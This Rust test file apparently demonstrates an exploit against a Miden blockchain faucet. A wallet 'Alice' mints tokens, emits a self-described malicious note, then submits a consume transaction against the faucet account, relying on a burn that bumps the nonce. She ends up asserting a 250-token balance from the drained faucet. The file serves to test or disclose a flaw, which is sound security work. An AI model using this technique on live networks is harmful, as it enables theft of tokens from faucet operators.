use std::sync::Arc;

use rand::random;

use miden_client::{
    ClientError, Felt, Word,
    account::{AccountStorageMode, AccountType},
    asset::{FungibleAsset, TokenSymbol},
    auth::AuthSecretKey,
    keystore::FilesystemKeyStore,
    note::{Note, NoteAssets, NoteExecutionHint, NoteFile, NoteMetadata, NoteTag, NoteType},
    transaction::{TransactionRequestBuilder, TransactionScript},
};
use miden_lib::{
    AuthScheme,
    account::{faucets::create_basic_fungible_faucet, wallets::create_basic_wallet},
    note::utils::build_p2id_recipient,
    transaction::TransactionKernel,
};
use miden_objects::crypto::dsa::rpo_falcon512;
mod util;

use crate::util::{DrainFaucet, reset_store, setup_client};

#[tokio::test]
async fn test_drain_faucet() {
    // clean the DB for the test
    reset_store().await;

    // --------------------------------------------------------------------------------
    // Setup keys for the accounts
    // --------------------------------------------------------------------------------
    // Faucet A
    let secret_key_faucet = rpo_falcon512::SecretKey::new();
    let pub_key_faucet = secret_key_faucet.public_key();
    let auth_scheme_faucet: AuthScheme = AuthScheme::RpoFalcon512 {
        pub_key: pub_key_faucet,
    };

    // Alice
    let secret_key_alice = rpo_falcon512::SecretKey::new();
    let pub_key_alice = secret_key_alice.public_key();
    let auth_scheme_alice: AuthScheme = AuthScheme::RpoFalcon512 {
        pub_key: pub_key_alice,
    };

    // --------------------------------------------------------------------------------
    // Setup authenticator / keystore
    //
    // This needs to happen before the client is created, since we need to init the client with this authenticator.
    // --------------------------------------------------------------------------------
    // Faucet authenticator (shared for both faucets)
    let faucet_authenticator = FilesystemKeyStore::new("keystore/faucets".into()).unwrap();
    faucet_authenticator
        .add_key(&AuthSecretKey::RpoFalcon512(secret_key_faucet))
        .unwrap();

    // Alice authenticator
    let alice_authenticator = FilesystemKeyStore::new("keystore/alice".into()).unwrap();
    alice_authenticator
        .add_key(&AuthSecretKey::RpoFalcon512(secret_key_alice))
        .unwrap();

    // --------------------------------------------------------------------------------
    // Create client instances
    // --------------------------------------------------------------------------------
    let mut faucet_client = setup_client(Arc::new(faucet_authenticator), "faucet_store.sqlite3")
        .await
        .unwrap();
    let mut alice_client = setup_client(Arc::new(alice_authenticator), "alice_store.sqlite3")
        .await
        .unwrap();

    // Sync state to get chain info instead of get_latest_epoch_block
    faucet_client.sync_state().await.unwrap();
    println!("Got sync state");

    // For now let's use the same max supply for both tokens
    let max_supply = Felt::new(1_000);

    let token_symbol = "NP";
    let token_symbol = TokenSymbol::try_from(token_symbol).unwrap();

    let decimals = 2u8;

    // --------------------------------------------------------------------------------
    // Create faucet accounts
    // --------------------------------------------------------------------------------
    let (faucet_account, faucet_seed) = create_basic_fungible_faucet(
        random(),
        token_symbol,
        decimals,
        max_supply,
        AccountStorageMode::Public,
        auth_scheme_faucet,
    )
    .unwrap();

    // --------------------------------------------------------------------------------
    // Create user/wallet accounts
    // --------------------------------------------------------------------------------
    let (alice, alice_seed) = create_basic_wallet(
        random(),
        auth_scheme_alice,
        AccountType::RegularAccountImmutableCode,
        AccountStorageMode::Public,
    )
    .unwrap();

    // --------------------------------------------------------------------------------
    // Track accounts in the client.
    //
    // Not the same as adding the keys to the authenticator. A client can track accounts without having their signing keys.
    // --------------------------------------------------------------------------------
    faucet_client
        .add_account(&faucet_account, Some(faucet_seed), false)
        .await
        .unwrap();

    alice_client
        .add_account(&alice, Some(alice_seed), false)
        .await
        .unwrap();

    // --------------------------------------------------------------------------------
    // Mint assets from the faucet account for alice
    // --------------------------------------------------------------------------------
    println!("Minting assets for Alice...");
    let mint_asset_a: FungibleAsset = FungibleAsset::new(faucet_account.id(), 100).unwrap();

    let transaction_request_a = TransactionRequestBuilder::new()
        .build_mint_fungible_asset(
            mint_asset_a,
            alice.id(),
            NoteType::Public,
            faucet_client.rng(),
        )
        .unwrap();

    let tx_result_a = faucet_client
        .new_transaction(faucet_account.id(), transaction_request_a)
        .await
        .unwrap();
    let note_for_alice = tx_result_a.created_notes().iter().next().unwrap();

    faucet_client
        .submit_transaction(tx_result_a.clone())
        .await
        .unwrap();
    println!("Submitted mint transaction for Alice");

    // Loop for up to 10 seconds, with 1 sec intervals, until import_note succeeds
    println!("Waiting for Alice's note to be confirmed on chain...");
    let start_time = std::time::Instant::now();
    let timeout = std::time::Duration::from_secs(10);
    let mut notes_for_alice = Vec::new();

    while start_time.elapsed() < timeout {
        let note_file = NoteFile::NoteId(note_for_alice.id());
        match alice_client.import_note(note_file).await {
            Ok(note) => {
                notes_for_alice.push(note);
                alice_client.sync_state().await.unwrap();
                println!("Alice's note found on chain, breaking");
                break;
            }
            Err(ClientError::NoteNotFoundOnChain(_)) => {
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                alice_client.sync_state().await.unwrap();
            }
            _ => {
                panic!("Failed");
            }
        }
    }

    // Only panic if we've timed out without finding the note
    if notes_for_alice.is_empty() {
        panic!("Notes not found on chain after 10 seconds");
    }

    // Need to have Alice consume the notes created by the faucet account
    println!("Building consume transaction for Alice...");
    let consume_request_a = TransactionRequestBuilder::new()
        .build_consume_notes(notes_for_alice)
        .unwrap();

    let tx_result_a = alice_client
        .new_transaction(alice.id(), consume_request_a)
        .await
        .unwrap();

    alice_client.submit_transaction(tx_result_a).await.unwrap();
    println!("Submitted consume transaction for Alice");

    alice_client
        .import_account_by_id(faucet_account.id())
        .await
        .unwrap();

    // --------------------------------------------------------------------------------
    // Now Alice attempts to drain the faucet
    // First, she emits a note that locks a small amount of the asset for her.
    // That asset will eventually be burned by the faucet account.
    // --------------------------------------------------------------------------------

    let asset_to_burn = mint_asset_a.into();
    let malicious_note_request = TransactionRequestBuilder::new()
        .drain_faucet(alice.id(), asset_to_burn)
        .build()
        .unwrap();

    let malicious_note_tx_result = alice_client
        .new_transaction(alice.id(), malicious_note_request)
        .await
        .unwrap();

    alice_client
        .submit_transaction(malicious_note_tx_result.clone())
        .await
        .unwrap();

    let note_for_alice = malicious_note_tx_result
        .created_notes()
        .iter()
        .next()
        .unwrap();

    // --------------------------------------------------------------------------------
    // Need to fetch the freshly created note.
    // --------------------------------------------------------------------------------

    let mut notes_for_alice = Vec::new();
    let start_time = std::time::Instant::now();
    while start_time.elapsed() < timeout {
        let note_file = NoteFile::NoteId(note_for_alice.id());
        match alice_client.import_note(note_file).await {
            Ok(note) => {
                notes_for_alice.push(note);
                alice_client.sync_state().await.unwrap();
                println!("Alice's note found on chain, breaking");
                break;
            }
            Err(ClientError::NoteNotFoundOnChain(_)) => {
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                alice_client.sync_state().await.unwrap();
            }
            Err(e) => {
                panic!("Failed: {:?}", e);
            }
        }
    }
    if notes_for_alice.is_empty() {
        panic!("Notes not found on chain after 10 seconds");
    }

    // --------------------------------------------------------------------------------
    // Now Alice executed a consume-note transaction against the faucet.
    // This should work, since the `burn` first bumps the nonce, so
    // the epilogue check of "changing account state -> nonce bumped" is satisfied.
    // --------------------------------------------------------------------------------

    let expected_output_note = Note::new(
        NoteAssets::new(vec![
            FungibleAsset::new(faucet_account.id(), 250).unwrap().into(),
        ])
        .unwrap(),
        NoteMetadata::new(
            faucet_account.id(),
            NoteType::Public,
            NoteTag::from_account_id(alice.id()),
            NoteExecutionHint::Always,
            Felt::new(27),
        )
        .unwrap(),
        build_p2id_recipient(alice.id(), Word::default()).unwrap(),
    );

    let drain_request = TransactionRequestBuilder::new()
        .with_custom_script(
            TransactionScript::compile(
                "begin\npush.1\ndrop\nend",
                TransactionKernel::assembler().with_debug_mode(true),
            )
            .unwrap(),
        )
        .build_consume_notes(notes_for_alice)
        .unwrap();

    let drain_tx_result = alice_client
        .new_transaction(faucet_account.id(), drain_request)
        .await
        .unwrap();

    alice_client
        .submit_transaction(drain_tx_result)
        .await
        .unwrap();

    // Wait for the note to be confirmed on chain
    let start_time = std::time::Instant::now();
    while start_time.elapsed() < timeout {
        let note_file = NoteFile::NoteId(expected_output_note.id());
        match alice_client.import_note(note_file).await {
            Ok(_) => {
                alice_client.sync_state().await.unwrap();
                println!("Alice's note found on chain, breaking");
                break;
            }
            Err(ClientError::NoteNotFoundOnChain(_)) => {
                tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                alice_client.sync_state().await.unwrap();
            }
            Err(e) => {
                panic!("Failed: {:?}", e);
            }
        }
    }

    // Now Alice can claim the drained asset
    println!("Claiming drained asset...");
    let claim_request = TransactionRequestBuilder::new()
        .build_consume_notes(vec![expected_output_note.id()])
        .unwrap();

    let claim_tx_result = alice_client
        .new_transaction(alice.id(), claim_request)
        .await
        .unwrap();

    alice_client
        .submit_transaction(claim_tx_result)
        .await
        .unwrap();

    // Wait for the transaction to be confirmed
    alice_client.sync_state().await.unwrap();

    // Check Alice's balance
    let alice_account = alice_client.get_account(alice.id()).await.unwrap().unwrap();
    let alice_balance = alice_account
        .account()
        .vault()
        .get_balance(faucet_account.id())
        .unwrap();
    assert_eq!(
        alice_balance, 250,
        "Alice should have received 250 tokens from the drained faucet"
    );
}
